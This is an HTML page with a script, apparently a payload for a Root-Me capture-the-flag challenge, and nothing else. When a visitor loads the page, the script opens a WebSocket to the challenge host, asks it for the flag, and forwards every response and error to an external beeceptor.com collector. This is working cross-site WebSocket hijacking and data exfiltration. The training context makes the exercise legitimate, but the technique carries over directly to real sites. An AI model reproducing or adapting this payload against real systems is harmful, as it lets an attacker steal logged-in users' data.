<h1>Hello</h1>
<script>
  var ws = new WebSocket('ws://ctf30.root-me.org/ws');
  ws.onopen = function() {
    ws.send("hello");
    ws.send("Get the flag");
  };
  ws.onmessage = function(event) {
    fetch('https://rootme.free.beeceptor.com/', {method: 'POST', mode: 'cors', body: event.data});
  };
  ws.onerror = function(event) {
    fetch('https://rootme.free.beeceptor.com/', {method: 'POST', mode: 'cors', body: event.data});
  };
</script>
